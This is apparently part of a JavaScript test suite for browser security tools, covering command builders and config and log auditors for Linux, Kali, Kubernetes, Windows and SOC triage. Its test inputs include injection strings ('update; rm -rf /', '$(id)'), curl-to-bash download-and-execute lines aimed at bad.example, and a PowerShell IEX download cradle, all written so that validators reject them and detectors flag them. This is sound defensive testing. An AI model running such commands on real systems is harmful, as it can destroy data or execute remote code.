  assert.ok(home.includes("'O'\\''Reilly*'"));
  assert.throws(()=>byId('linux-find-builder').run({path:'/var/log',type:'f;id',pattern:'*.log',days:'7'}),/Invalid option for Entry type/);
  assert.throws(()=>byId('linux-find-builder').run({path:'/var/../etc',type:'f',pattern:'*',days:'7'}),/Parent traversal/);
  assert.throws(()=>byId('linux-find-builder').run({path:'/var/log',type:'f',pattern:'*.log',days:'36501'}),/whole number from 0 to 36500/);
  assert.throws(()=>byId('linux-find-builder').run({path:'$(id)',type:'f',pattern:'*',days:'7'}),/absolute or safe home-directory path/);
});

test('Ubuntu APT planner rejects unknown tasks and malformed package names', () => {
  assert.ok(byId('ubuntu-apt-plan').run({task:'update-index',package:'curl'}).startsWith('sudo apt update'));
  assert.throws(()=>byId('ubuntu-apt-plan').run({task:'update; rm -rf /',package:'curl'}),/Invalid option for Maintenance task/);
  assert.throws(()=>byId('ubuntu-apt-plan').run({task:'install',package:'curl;id'}),/valid package name/);
  assert.throws(()=>byId('ubuntu-apt-plan').run({task:'remove',package:'--purge'}),/valid package name/);
  assert.ok(byId('ubuntu-apt-plan').run({task:'install',package:'python3-pip'}).includes('sudo apt install python3-pip'));
});

test('Kali route, Nmap and hash parsers return bounded deterministic results', () => {
  const route = byId('kali-route-review').run({output:'default via 192.168.1.1 dev wlan0 metric 100\n192.168.1.0/24 dev wlan0'});
  assert.match(route,/Routes: 2/);
  assert.match(route,/Default routes: 1/);
  assert.match(route,/Interfaces: wlan0/);
  assert.match(route,/\[DEFAULT\] default via 192\.168\.1\.1/);
  assert.match(byId('kali-route-review').run({output:'\n\n'}),/Routes: 0/);
  assert.throws(()=>byId('kali-route-review').run({output:'x'.repeat(100001)}),/maximum 100,000 characters/);

  const nmap = byId('kali-nmap-output-review').run({output:'PORT STATE SERVICE\n22/tcp open ssh\n443/tcp closed https'});
  assert.match(nmap,/Parsed ports: 2/);
  assert.match(nmap,/Open: 1/);
  assert.match(byId('kali-nmap-output-review').run({output:'not an nmap table'}),/Parsed ports: 0/);
  assert.throws(()=>byId('kali-nmap-output-review').run({output:'x'.repeat(100001)}),/maximum 100,000 characters/);

  assert.match(byId('kali-hash-identify').run({hash:'a'.repeat(64)}),/SHA-256/);
  assert.match(byId('kali-hash-identify').run({hash:'a'.repeat(33)}),/Unknown common digest length/);
  assert.throws(()=>byId('kali-hash-identify').run({hash:'abc-123'}),/hexadecimal digest/);
  assert.throws(()=>byId('kali-hash-identify').run({hash:'a'.repeat(257)}),/maximum 256 hexadecimal characters/);
  assert.throws(()=>byId('kali-hash-identify').run({hash:'أ'.repeat(32)}),/hexadecimal digest/);
});

test('Shared input validation bounds text and rejects embedded NUL characters', () => {
   assert.throws(()=>byId('case').run({text:'x'.repeat(200001),mode:'upper'}),/Text input is too long \(maximum 200000 characters\)/);
});



test('Cloudflare Wrangler auditor flags plaintext secret-like variables without echoing values', () => {
  const output = byId('wrangler-config-audit').run({config:[
    'name = "worker"',
    'main = "src/index.js"',
    'compatibility_date = "2026-11-18"',
    '[vars]',
    'API_TOKEN = "do-not-print-this-secret"',
    '[env.production]',
  ].join('\n')});
  assert.match(output,/HIGH line 5/);
  assert.doesNotMatch(output,/do-not-print-this-secret/);
  assert.match(output,/Wrangler configuration review/);
  assert.match(byId('wrangler-config-audit').run({config:'name = "worker"'}),/compatibility_date/);
});

test('Kubernetes manifest reviewer flags dangerous pod and image settings', () => {
  const output = byId('k8s-manifest-audit').run({manifest:[
    'kind: Deployment',
    'spec:',
    '  template:',
    '    spec:',
    '      hostNetwork: true',
    '      containers:',
    '        - name: web',
    '          image: nginx:latest',
    '          securityContext:',
    '            privileged: true',
    '            runAsUser: 0',
  ].join('\n')});
  assert.match(output,/host network namespace/);
  assert.match(output,/privileged mode/);
  assert.match(output,/UID 0/);
  assert.match(output,/not pinned/);
});

test('SQL migration reviewer detects unbounded writes and destructive DDL', () => {
  const output = byId('sql-migration-review').run({sql:[
    'DELETE FROM sessions;',
    'UPDATE users SET role = "admin";',
    'DROP TABLE audit_events;',
    'GRANT SELECT ON users TO PUBLIC;',
  ].join('\n')});
  assert.match(output,/DELETE has no WHERE clause/);
  assert.match(output,/UPDATE has no WHERE clause/);
  assert.match(output,/destructive DROP/);
  assert.match(output,/granted to PUBLIC/);
  const safe = byId('sql-migration-review').run({sql:'BEGIN;\nUPDATE users SET active = false WHERE id = 7;\nCOMMIT;'});
  assert.doesNotMatch(safe,/UPDATE has no WHERE clause/);
  assert.throws(()=>byId('sql-migration-review').run({sql:'  '}),/Paste a SQL migration script/);
});


test('new Linux, Kali and Termux command builders produce bounded commands without execution', () => {
  const ids = [
    'linux-listening-sockets','linux-network-state','linux-service-status','linux-journal-filter',
    'linux-sha256-file','linux-grep-ioc','linux-find-large-files','kali-nmap-service-audit',
    'kali-nikto-web-audit','kali-ffuf-content-audit','kali-pcap-summary','kali-tcpdump-capture',
    'linux-dig-record','linux-openssl-tls','linux-curl-security-headers','linux-yara-file-scan',
    'linux-ufw-status','linux-ssh-config-audit','termux-environment-audit','termux-storage-check',
    'termux-package-audit','termux-network-diagnostics','kali-tool-presence-audit'
  ];
  for (const id of ids) {
    const tool = byId(id);
    assert.equal(tool.mode,'command',id+' is clearly labeled as a command builder');
    assert.ok(tool.run({}),id+' returns a command preview');
  }
  assert.throws(()=>byId('linux-service-status').run({unit:"ssh';id"}),/valid systemd unit/);
  assert.throws(()=>byId('linux-service-status').run({unit:'ssh;id'}),/valid systemd unit/);
  assert.match(byId('linux-sha256-file').run({path:"file name; touch /tmp/pwned"}),/sha256sum -- 'file name; touch \/tmp\/pwned'/);
  assert.match(byId('linux-grep-ioc').run({pattern:"x' ; id",path:'/var/log'}),/grep -RInI.*'x'\\'' ; id'/);
  assert.throws(()=>byId('linux-journal-filter').run({unit:'ssh.service',lines:'5001'}),/whole number from 1 to 5000/);
  assert.throws(()=>byId('linux-find-large-files').run({path:'',size:'10'}),/Enter a directory path/);
  assert.match(byId('kali-nmap-service-audit').run({target:'192.0.2.10',ports:'22,443'}),/nmap -sV.*-p '22,443'.*192.0.2.10/);
  assert.throws(()=>byId('kali-nmap-service-audit').run({target:'example.com;id',ports:'80'}),/valid public domain/);
  assert.throws(()=>byId('kali-nmap-service-audit').run({target:'example.com',ports:'80;id'}),/comma-separated TCP ports/);
  assert.throws(()=>byId('kali-nikto-web-audit').run({url:'http://example.com'}),/Only HTTPS URLs/);
  assert.throws(()=>byId('kali-ffuf-content-audit').run({url:'https://example.com/',wordlist:'/tmp/list',rate:'10'}),/literal FUZZ marker/);
  assert.throws(()=>byId('kali-ffuf-content-audit').run({url:'https://example.com/FUZZ',wordlist:'/tmp/list',rate:'51'}),/whole number from 1 to 50/);
  assert.throws(()=>byId('kali-tcpdump-capture').run({iface:'eth0;id',count:'10',output:'capture.pcap'}),/valid interface name/);
  assert.match(byId('linux-dig-record').run({domain:'example.com',type:'MX'}),/example.com.* MX/);
  assert.throws(()=>byId('linux-dig-record').run({domain:'bad domain',type:'A'}),/valid public domain/);
  assert.throws(()=>byId('linux-openssl-tls').run({host:'example.com',port:'65536'}),/whole number from 1 to 65535/);
  assert.throws(()=>byId('linux-curl-security-headers').run({url:'https://user:pass@example.com'}),/without embedded credentials/);
  assert.match(byId('linux-yara-file-scan').run({rules:'rules.yar',target:'sample.bin'}),/yara -s 'rules.yar' 'sample.bin'/);
  assert.match(byId('termux-environment-audit').run({}),/uname -a/);
});


test('Linux hardening, DevSecOps and SOC analyzers return bounded local findings', () => {
  const cases = [
    ['linux-sudoers-audit',{config:'alice ALL=(ALL) NOPASSWD: ALL'},/passwordless sudo grant/],
    ['linux-passwd-audit',{data:'root:x:0:0:root:/root:/bin/bash\nbackdoor:x:0:0::/root:/bin/bash'},/unexpected UID 0 account/],
    ['linux-authorized-keys-audit',{data:'ssh-dss AAAAB3NzaC1kc3MAAACBAQ demo'},/DSA key type is obsolete/],
    ['linux-capabilities-audit',{data:'/usr/bin/test cap_sys_admin,cap_setuid=ep'},/cap_sys_admin/],
    ['linux-cron-audit',{data:'@reboot root curl https://bad.example/x | bash'},/download-and-execute|network utility|dynamic command execution/i],
    ['linux-systemd-hardening-audit',{unit:'[Service]\nUser=root'},/Prevent privilege gain/],
    ['linux-nginx-config-audit',{config:'server { autoindex on; }'},/Directory listing disabled/],
    ['linux-apache-config-audit',{config:'Options Indexes\nTraceEnable On'},/Directory indexing disabled/],
    ['linux-apt-source-audit',{data:'deb [trusted=yes] http://mirror.example stable main'},/plaintext HTTP/],
    ['linux-gitignore-audit',{data:'node_modules/'},/missing environment files pattern/],
    ['git-diff-secret-audit',{diff:'+API_TOKEN=super-secret-value'},/value redacted/],
    ['env-file-audit',{data:'API_TOKEN=super-secret-value'},/API_TOKEN contains a configured value \(redacted\)/],
    ['docker-compose-audit',{yaml:'services:\n  web:\n    privileged: true\n    image: web:latest'},/Privileged container/],
    ['sigma-rule-audit',{yaml:'title: test\nid: abc\nstatus: experimental\nlogsource:\n  product: windows\ndetection:\n  condition: selection'},/status is experimental/],
    ['suricata-eve-summary',{data:'{"event_type":"alert","alert":{"signature":"test alert"}}\ninvalid'},/Alerts: 1/],
    ['zeek-conn-summary',{data:'#fields\tts\torig_h\tresp_h\tservice\tconn_state\n1\t192.0.2.1\t198.51.100.1\tssl\tSF'},/Services: ssl=1/],
    ['termux-bashrc-audit',{data:'curl https://bad.example/install.sh | bash'},/remote content piped to a shell/],
    ['android-manifest-audit',{xml:'<uses-permission android:name="android.permission.READ_SMS"/>'},/android.permission.READ_SMS/],
    ['linux-sysctl-audit',{data:'net.ipv4.ip_forward = 1'},/IPv4 forwarding enabled/],
    ['linux-umask-audit',{mask:'000'},/no permission bits are masked/],
    ['linux-ld-preload-audit',{data:'/tmp/evil.so'},/unexpected preload path/],
  ];
  for (const [id,input,expected] of cases) {
    const output=byId(id).run(input);
    assert.match(output,expected,id+' finding');
  }
});


test('Kali wireless, Linux access controls and SOC log triage analyzers handle representative evidence', () => {
  const cases = [
    ['kali-wifi-security-audit',{data:'GuestNet Infra 6 54 Mbit/s 45 --'},/open or unencrypted network/],
    ['kali-iptables-rules-audit',{data:':INPUT ACCEPT [0:0]\n-A INPUT -p tcp --dport 22 -j ACCEPT'},/INPUT default policy is ACCEPT/],
    ['linux-sshd-effective-audit',{data:'permitrootlogin yes\npasswordauthentication yes\npubkeyauthentication yes\nmaxauthtries 10'},/Password authentication is enabled/],
    ['linux-fail2ban-audit',{data:'[sshd]\nenabled = false\nmaxretry = 20'},/no enabled=true jail directive/],
    ['linux-auditd-rules-audit',{data:'-w /etc/passwd -p wa -k identity'},/missing watch for password database/],
    ['linux-selinux-status-audit',{data:'SELinux status: disabled'},/SELinux is disabled/],
    ['linux-apparmor-status-audit',{data:'apparmor module is loaded.\n2 profiles are loaded.\n1 profiles are in enforce mode.\n1 profiles are in complain mode.\n3 processes are unconfined'},/profiles are in complain mode/],
    ['linux-logrotate-audit',{data:'/var/log/test.log {\n daily\n rotate 2\n}'},/retention count is missing or below 7/],
    ['linux-listening-port-review',{data:'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*'},/Wildcard-bound listeners: 1/],
    ['linux-user-session-audit',{data:'admin pts/0 2026-11-20 09:00 (192.0.2.10)'},/Remote sessions: 1/],
    ['linux-kernel-message-audit',{data:'[1.0] audit: disabled (until reboot)'},/Security control disabled/],
    ['termux-sshd-config-audit',{data:'PermitRootLogin yes\nPasswordAuthentication yes'},/Root login disabled/],
    ['termux-path-audit',{path:':/system/bin'},/empty entry/],
    ['termux-info-audit',{data:'TERMUX_VERSION=0.1\nTERMUX_APK_RELEASE=PLAY_STORE\nTERMUX_REPO=http://repo.example'},/Play Store build/],
    ['soc-sysmon-event-summary',{data:'{"EventID":1}\n{"EventID":3}\n{"EventID":22}'},/1=1, 3=1, 22=1/],
    ['soc-windows-4625-triage',{data:'{"EventID":4625,"TargetUserName":"admin","IpAddress":"192.0.2.10"}'},/Failed logons: 1/],
    ['soc-ssh-auth-burst',{data:Array(5).fill('Failed password for root from 192.0.2.10 port 50001 ssh2').join('\n')},/192.0.2.10=5/],
    ['soc-zeek-dns-summary',{data:'#fields\tts\tquery\trcode_name\n1\texample.com\tNOERROR'},/example.com=1/],
    ['soc-yara-rule-audit',{data:'rule Broken { strings: $a = "x" }'},/condition section missing/],
  ];
  for (const [id,input,expected] of cases) {
    assert.match(byId(id).run(input),expected,id+' representative finding');
  }
});


test('Linux, Kali and SOC configuration and evidence analyzers cover representative edge cases', () => {
  const cases = [
    ['linux-nftables-audit',{data:'chain input { type filter hook input priority filter; policy accept; }'},/input chain default policy is accept/],
    ['linux-pam-policy-audit',{data:'auth required pam_unix.so nullok'},/nullok permits empty passwords/],
    ['linux-login-defs-audit',{data:'PASS_MAX_DAYS -1\nPASS_MIN_DAYS 0\nENCRYPT_METHOD MD5'},/PASS_MAX_DAYS missing, disabled or above 365/],
    ['linux-mount-options-audit',{data:'tmpfs on /tmp type tmpfs (rw,relatime)'},/missing nosuid/],
    ['linux-hosts-file-audit',{data:'203.0.113.10 example.com'},/non-local hostname override/],
    ['linux-resolver-audit',{data:'nameserver 8.8.8.8'},/public resolver address configured/],
    ['linux-known-hosts-audit',{data:'example.com ssh-dss AAAAB3NzaC1kc3MAAACBAQ'},/obsolete DSA host key/],
    ['linux-ldd-audit',{data:'libbad.so => not found'},/unresolved dependency/],
    ['termux-getprop-audit',{data:'[ro.debuggable]: [1]\n[ro.secure]: [0]'},/Android build is marked debuggable/],
    ['termux-ssh-client-audit',{data:'Host *\n StrictHostKeyChecking no\n ForwardAgent yes'},/host-key verification is disabled/],
    ['kali-monitor-capability-review',{data:'Supported interface modes:\n * managed\n * AP'},/Monitor mode advertised: NOT FOUND/],
    ['kali-wireless-interface-review',{data:'Interface wlan0\n type monitor'},/wlan0: monitor/],
    ['soc-zeek-http-summary',{data:'#fields\tts\tmethod\thost\tstatus_code\n1\tGET\texample.com\t404'},/Statuses: 404=1/],
    ['soc-zeek-ssl-summary',{data:'#fields\tts\tversion\tvalidation_status\n1\tTLSv13\t ok'},/TLSv13=1/],
    ['soc-powershell-4104-triage',{data:'IEX (New-Object Net.WebClient).DownloadString("https://example.invalid/a.ps1")'},/Remote content retrieval/],
    ['soc-windows-rdp-triage',{data:'{"EventID":4624,"LogonType":10,"IpAddress":"192.0.2.10"}'},/RDP logons: 1/],
    ['soc-firewall-log-summary',{data:'kernel: [UFW BLOCK] SRC=192.0.2.10 DST=198.51.100.20 DPT=22'},/192.0.2.10=1/],
    ['soc-dns-tunnel-heuristic',{data:'verylongencodedpayloadsegment12345678901234567890.tunnel.example.com'},/long DNS label/],
    ['soc-web-probe-triage',{data:'GET /.env HTTP/1.1'},/Sensitive file discovery/],
    ['kali-nmap-grepable-review',{data:'Host: 192.0.2.10 (server.example) Status: Up\nHost: 192.0.2.10 (server.example) Ports: 22/open/tcp//ssh///'},/Open ports parsed: 1/],
  ];
  for (const [id,input,expected] of cases) {
    assert.match(byId(id).run(input),expected,id+' representative finding');
  }
});


test('Termux diagnostics remain local and secret analyzers redact values', () => {
  const termux = byId('termux-network-diagnostics');
  assert.equal(termux.mode,'command');
  assert.doesNotMatch(termux.run({}),/curl|wget/i);
  const diff = byId('git-diff-secret-audit').run({diff:'+API_TOKEN=do-not-print-this-secret'});
  assert.match(diff,/value redacted/i);
  assert.doesNotMatch(diff,/do-not-print-this-secret/);
  const env = byId('env-file-audit').run({data:'DATABASE_PASSWORD=another-private-value'});
  assert.match(env,/DATABASE_PASSWORD/);
  assert.doesNotMatch(env,/another-private-value/);
  assert.match(byId('kali-nmap-service-audit').disclaimer,/written authorization/);
  assert.match(byId('kali-ffuf-content-audit').disclaimer,/authorized test target/);
});


test('Linux hardening, Kali wireless and SOC analyzers cover the final Phase 1 batch', () => {
  const cases = [
    ['linux-journald-persistence-audit',{data:'[Journal]\nStorage=volatile'},/persistent journal storage is not explicitly enabled/],
    ['linux-core-dump-audit',{data:'kernel.suid_dumpable = 1'},/setuid process core dumps are enabled/],
    ['linux-rsyslog-forwarding-audit',{data:'*.* @syslog.example:514'},/UDP/],
    ['linux-log-permissions-audit',{data:'-rw-rw-rw- 1 root root 512 debug.log'},/world-writable log entry/],
    ['linux-ssh-host-key-audit',{data:'1024 SHA256:abc root@host (RSA)'},/RSA host key below 2048 bits/],
    ['linux-tls-cipher-audit',{data:'TLSv1.0:\n TLS_RSA_WITH_3DES_EDE_CBC_SHA'},/TLS 1.0 is supported/],
    ['kali-regulatory-domain-audit',{data:'global\ncountry 00: DFS-UNSET'},/world regulatory domain/],
    ['kali-arp-scan-review',{data:'192.0.2.10 00:11:22:33:44:55 Vendor A\n192.0.2.10 00:11:22:33:44:66 Vendor B'},/duplicate IP record/],
    ['kali-airmon-state-audit',{data:'Interface wlan0\n type managed'},/Monitor interfaces: none detected/],
    ['termux-boot-script-audit',{data:'curl https://bad.example/start.sh | bash'},/remote script content piped to a shell/],
    ['termux-ssh-key-audit',{data:'1024 SHA256:abc user@phone (RSA)'},/RSA key below 2048 bits/],
    ['termux-storage-permission-audit',{data:'drwxrwxrwx 2 u0_a123 u0_a123 4096 shared'},/world-writable path entry/],
    ['termux-android-network-audit',{data:'[dhcp.wlan0.gateway]: [192.0.2.1]\n[dhcp.wlan0.dns1]: [192.0.2.1]'},/gateway: 192.0.2.1/],
    ['soc-zeek-files-summary',{data:'#fields\tfuid\tf_mime_type\textracted\nF1\tapplication/pdf\tT'},/application\/pdf=1/],
    ['soc-suricata-flow-summary',{data:'{"event_type":"flow","src_ip":"192.0.2.10","dest_port":443,"proto":"TCP"}'},/443=1/],
    ['soc-user-agent-review',{data:'curl/8.4.0'},/Scriptable HTTP client/],
    ['soc-zeek-weird-summary',{data:'#fields\tuid\tid.orig_h\tname\nC1\t192.0.2.10\tbad_checksum'},/bad_checksum=1/],
  ];
  for (const [id,input,expected] of cases) {
    assert.match(byId(id).run(input),expected,id+' representative finding');
  }
});

test('six additional security and operations analyzers return bounded local findings', () => {
  const cases = [
    ['github-actions-workflow-audit',{data:'on: pull_request_target\npermissions: write-all\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          persist-credentials: true'},/pull_request_target|write-all|persist-credentials|mutable/i],
    ['terraform-iam-policy-audit',{data:'{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'},/wildcard action scope|all resources/i],
    ['cyclonedx-sbom-audit',{data:'{"bomFormat":"CycloneDX","specVersion":"1.5","components":[{"type":"library","name":"demo","purl":"pkg:npm/demo"},{"type":"library","name":"demo","purl":"pkg:npm/demo"}]}'},/duplicate package URLs/i],
    ['windows-defender-status-audit',{data:'AntivirusEnabled : True\nRealTimeProtectionEnabled : False\nBehaviorMonitorEnabled : True'},/RealTimeProtectionEnabled is False/i],
    ['windows-firewall-profile-audit',{data:'Name : Public\nEnabled : False\nDefaultInboundAction : Allow\nDefaultOutboundAction : Allow'},/Public firewall profile is disabled|default inbound action is Allow/i],
    ['linux-mount-hardening-audit',{data:'/tmp rw,relatime\n/var/tmp rw,nosuid,nodev\n/dev/shm rw,nosuid,nodev,noexec'},/missing nodev|missing nosuid|missing noexec/i],
  ];
  for (const [id,input,expected] of cases) assert.match(byId(id).run(input),expected,id+' representative finding');
  assert.throws(()=>byId('terraform-iam-policy-audit').run({data:'not json'}),/valid IAM policy JSON/);
  assert.throws(()=>byId('cyclonedx-sbom-audit').run({data:'{"components":[]}'}),/CycloneDX JSON/);
  assert.throws(()=>byId('windows-defender-status-audit').run({data:'no recognized values'}),/No recognized Defender/);
});

test('Windows BitLocker, RDP and UAC posture analyzers detect insecure settings', () => {
  assert.match(byId('windows-bitlocker-status-audit').run({data:'MountPoint : C:\nVolumeStatus : FullyDecrypted\nProtectionStatus : Off\nEncryptionPercentage : 0'}),/fully decrypted|ProtectionStatus is Off/i);
  assert.match(byId('windows-rdp-posture-audit').run({data:'fDenyTSConnections : 0\nUserAuthentication : 0\nPortNumber : 3389'}),/NLA is disabled|Network Level Authentication is disabled/i);
  assert.match(byId('windows-uac-policy-audit').run({data:'EnableLUA : 0\nConsentPromptBehaviorAdmin : 0\nPromptOnSecureDesktop : 0'}),/disables UAC|Never notify/i);
});

test('Python requirements, npm lockfile and CODEOWNERS analyzers validate supply-chain metadata', () => {
  assert.match(byId('python-requirements-supply-chain-audit').run({data:'requests>=2.31\n--extra-index-url http://packages.example/simple\ngit+https://github.com/example/project.git'}),/not pinned|plaintext HTTP|direct URL/i);
  assert.match(byId('npm-lockfile-integrity-audit').run({data:'{"lockfileVersion":3,"packages":{"":{"name":"demo"},"node_modules/a":{"version":"1.0.0","resolved":"http://registry.npmjs.org/a.tgz"}}}'}),/insecure HTTP|integrity/i);
  assert.match(byId('codeowners-coverage-audit').run({data:'* @org/team'}),/no explicit ownership pattern|backend/i);
  assert.throws(()=>byId('npm-lockfile-integrity-audit').run({data:'{}'}),/package-lock version/);
  assert.throws(()=>byId('codeowners-coverage-audit').run({data:'# no rules'}),/No CODEOWNERS rules/);
});

test('new tool categories are present in the registry and homepage navigation', () => {
  assert.ok(tools.some(tool=>tool.id==='wrangler-config-audit'&&tool.cat==='cloud'));
  assert.ok(tools.some(tool=>tool.id==='k8s-manifest-audit'&&tool.cat==='cloud'));
  assert.ok(tools.some(tool=>tool.id==='sql-migration-review'&&tool.cat==='database'));
  assert.match(homeMarkup,/tools\.html\?category=cloud/);
  assert.match(homeMarkup,/tools\.html\?category=database/);
  assert.match(homeMarkup,/tools\.html\?category=termux/);
});

test('public homepage does not run the authenticated tool bootstrap', () => {
  assert.match(homeMarkup, /id="homeToolTotal"/);
  assert.match(source, /if\s*\(grid\)\s*initializeAuthorizedTools\(\)/);
  assert.match(source, /else\s*\{\s*const counts=\{all:tools\.length/);
  assert.match(source, /\$\$\('\[data-home-count\]'\)\.forEach/);
});


test('Docker, Kubernetes, SSH and Dependabot analyzers detect representative hardening gaps', () => {
  const dockerAudit=byId('dockerfile-hardening-audit').run({data:'FROM node:latest\nADD https://example.invalid/app.tar.gz /tmp/a\nEXPOSE 2375'});
  assert.match(dockerAudit,/mutable or unpinned/i);
  assert.match(dockerAudit,/remote content/i);
  assert.match(dockerAudit,/2375/);
  assert.match(dockerAudit,/no USER/i);
  assert.match(byId('dockerfile-hardening-audit').run({data:'FROM scratch\nCOPY app /app\nUSER 10001'}),/No high-risk Dockerfile patterns/);
  assert.match(byId('kubernetes-image-policy-audit').run({data:'containers:\n- name: app\n  image: example/app@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'}),/immutable SHA-256 digests/);
  assert.match(byId('kubernetes-pod-security-audit').run({data:'kind: Pod\nspec:\n  hostNetwork: true\n  containers:\n  - securityContext:\n      privileged: true\n      runAsUser: 0'}),/privileged|UID 0|host network/i);
  assert.match(byId('kubernetes-rbac-wildcard-audit').run({data:'kind: ClusterRoleBinding\nroleRef:\n  name: cluster-admin\nsubjects:\n- kind: Group\n  name: system:masters\n---\nkind: ClusterRole\nrules:\n- verbs: ["*"]\n  resources: ["*"]\n  apiGroups: ["*"]'}),/cluster-admin|wildcard|system:masters/i);
  assert.match(byId('ssh-client-config-hardening-audit').run({data:'Host *\n StrictHostKeyChecking no\n UserKnownHostsFile /dev/null\n ForwardAgent yes'}),/host-key verification is disabled|known-host persistence is disabled|agent forwarding/i);
  assert.match(byId('github-dependabot-config-audit').run({data:'version: 1\nupdates:\n  - package-ecosystem: npm\n    directory: /'}),/expected Dependabot configuration version|schedule interval/i);
  assert.match(byId('kubernetes-image-policy-audit').run({data:'containers:\n- image: example/app:latest\n  imagePullPolicy: IfNotPresent'}),/mutable or untagged|latest tag combined/i);
  assert.throws(()=>byId('kubernetes-rbac-wildcard-audit').run({data:'kind: ConfigMap'}),/No Kubernetes RBAC kind/);
  assert.throws(()=>byId('kubernetes-image-policy-audit').run({data:'kind: Pod'}),/No container image declarations/);
});

test('Compose, Kubernetes NetworkPolicy, Helm, GitHub branch protection and OS policy analyzers detect gaps', () => {
  assert.match(byId('docker-compose-security-audit').run({data:'services:\n  api:\n    image: api:latest\n    privileged: true\n    network_mode: host\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock'}),/privileged|host network|Docker socket|mutable/i);
  assert.match(byId('kubernetes-network-policy-audit').run({data:'kind: NetworkPolicy\nspec:\n  podSelector: {}\n  ingress:\n    - {}\n  egress:\n    - to:\n        - ipBlock:\n            cidr: 0.0.0.0/0'}),/empty podSelector|empty ingress|unrestricted IP/i);
  assert.match(byId('helm-values-security-audit').run({data:'securityContext:\n  runAsUser: 0\n  privileged: true\nnetworkPolicy:\n  enabled: false\npassword: plaintext'}),/UID 0|privileged|network policy is disabled|plaintext credential/i);
  assert.match(byId('github-branch-protection-audit').run({data:'{"required_pull_request_reviews":{"required_approving_review_count":0},"required_status_checks":null,"enforce_admins":false,"allow_force_pushes":true,"allow_deletions":true}'}),/approving pull-request review|status checks|force pushes|branch deletion/i);
  assert.match(byId('linux-systemd-socket-audit').run({data:'[Socket]\nListenStream=0.0.0.0:9000\nSocketUser=root\nSocketMode=0666'}),/all network interfaces|owned by root|broad access/i);
  assert.match(byId('windows-powershell-execution-policy-audit').run({data:'Scope ExecutionPolicy\nProcess Bypass\nCurrentUser Unrestricted\nLocalMachine RemoteSigned'}),/Process execution policy is Bypass|CurrentUser execution policy is Unrestricted/i);
  assert.throws(()=>byId('github-branch-protection-audit').run({data:'not json'}),/valid branch protection JSON/);
  assert.throws(()=>byId('windows-powershell-execution-policy-audit').run({data:'No policy'}),/No recognized PowerShell execution policy rows/);
});


test('every browser tool has a complete and valid schema', () => {
  const allowedCategories = new Set([
    'networking', 'security', 'soc', 'linux', 'ubuntu', 'kali',
    'bash', 'termux', 'developer', 'cloud', 'database'
  ]);
  assert.ok(tools.length > 0, 'tool registry is not empty');
  for (const tool of tools) {
    assert.match(tool.id, /^[a-z0-9-]+$/, 'tool ID uses a safe stable format');
    assert.equal(typeof tool.name, 'string');
    assert.ok(tool.name.trim().length > 0, tool.id + ' has a name');
    assert.equal(typeof tool.desc, 'string');
    assert.ok(tool.desc.trim().length > 0, tool.id + ' has a description');
    assert.ok(allowedCategories.has(tool.cat), tool.id + ' has a known category');
    assert.equal(typeof tool.symbol, 'string');
    assert.ok(tool.symbol.trim().length > 0, tool.id + ' has a symbol');
    assert.equal(typeof tool.run, 'function', tool.id + ' has an executable handler');
    const fields = tool.fields ?? [];
    assert.ok(Array.isArray(fields), tool.id + ' has an optional fields array');
    for (const field of fields) {
      assert.ok(Array.isArray(field) && field.length >= 3, tool.id + ' has a valid field tuple');
      assert.equal(typeof field[0], 'string');
      assert.ok(field[0].trim().length > 0);
      assert.equal(typeof field[1], 'string');
      assert.ok(field[1].trim().length > 0);
      assert.equal(typeof field[2], 'string');
    }
  }
});

test('backend authorization catalog exactly matches the frontend registry', async () => {
  const backendSource = await readFile(new URL('../../backend/src/index.js', import.meta.url), 'utf8');
  const declaration = /const\s+TOOLS\s*=\s*\[/.exec(backendSource);
  assert.ok(declaration, 'backend tool catalog exists');
  const start = declaration.index + declaration[0].length;
  const end = backendSource.indexOf('\n];', start);
  assert.ok(end > start, 'backend tool catalog closes cleanly');
  const backendIds = [...backendSource.slice(start, end).matchAll(/"id"\s*:\s*"([a-z0-9-]+)"/g)].map(match => match[1]);
  const frontendIds = tools.map(tool => tool.id);
  assert.equal(new Set(frontendIds).size, frontendIds.length, 'frontend tool IDs are unique');
  assert.equal(new Set(backendIds).size, backendIds.length, 'backend tool IDs are unique');
  assert.deepEqual([...backendIds].sort(), [...frontendIds].sort(), 'backend authorization IDs exactly match frontend tool IDs');
});

test('eight new website analyzers detect representative configuration risks', () => {
  assert.match(byId('nginx-config-audit').run({data:'server { listen 80; server_tokens on; autoindex on; proxy_ssl_verify off; }'}),/directory listing|proxy TLS|server_tokens/i);
  assert.match(byId('apache-config-audit').run({data:'ServerTokens Full\nServerSignature On\nOptions Indexes\nSSLProxyVerify none'}),/directory indexes|ServerTokens|verification/i);
  assert.match(byId('github-actions-permissions-audit').run({data:'on: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4'}),/permissions|pull_request_target|full commit SHA/i);
  assert.match(byId('terraform-s3-public-access-audit').run({data:'acl = "public-read"\nblock_public_acls = false'}),/public|false/i);
  const envReport=byId('env-secret-exposure-audit').run({data:'API_KEY=supersecretvalue\nAPP_ENV=production'});
  assert.match(envReport,/API_KEY/);
  assert.doesNotMatch(envReport,/supersecretvalue/);
  assert.match(byId('kubernetes-ingress-tls-audit').run({data:'kind: Ingress\nspec:\n  rules:\n  - host: "*"'}),/TLS block|wildcard/i);
  assert.match(byId('postgresql-config-audit').run({data:"listen_addresses = '*'\nssl = off\npassword_encryption = md5\nhost all all 0.0.0.0/0 trust"}),/all interfaces|TLS|MD5|trust|broad IPv4/i);
  assert.match(byId('systemd-service-hardening-audit').run({data:'[Service]\nUser=root\nNoNewPrivileges=false\nPrivateTmp=false\nProtectSystem=off'}),/root|NoNewPrivileges|PrivateTmp|ProtectSystem/i);
});
